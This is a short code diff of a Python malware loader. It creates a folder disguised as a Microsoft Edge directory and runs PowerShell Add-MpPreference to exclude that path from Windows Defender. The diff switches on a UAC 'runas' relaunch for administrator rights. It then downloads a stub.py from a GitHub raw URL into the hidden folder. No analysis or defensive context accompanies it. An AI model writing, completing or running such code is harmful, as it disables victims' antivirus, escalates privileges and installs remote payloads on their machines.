@@ -19,12 +19,12 @@ os.makedirs("C:\\Apps\\Windows\\MicrosoftEdge\\set")
 fil = current.text[0]
 
 # Construct the command to add the exclusion
-command = f"powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"{path_to_exclude}\""
+command = f"powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath {path_to_exclude}"
 
 try:
-    # if not ctypes.windll.shell32.IsUserAnAdmin():
+    if not ctypes.windll.shell32.IsUserAnAdmin():
     #     # If not running as admin, relaunch with admin privileges
-    #     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
 
     subprocess.run(command, check=True, shell=True)
 
@@ -35,7 +35,7 @@ try:
         z.close()
         os.remove(f"C:\\Apps\\Windows\\MicrosoftEdge\\set\\{fil}.zip")
 
-        with open("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\stub.py", "w") as ff:
+        with open("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\stub.py", "wb") as ff:
             stubUrl = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/stub.py'
             stubr = requests.get(stubUrl, allow_redirects=True)
             ff.write(stubr.content)
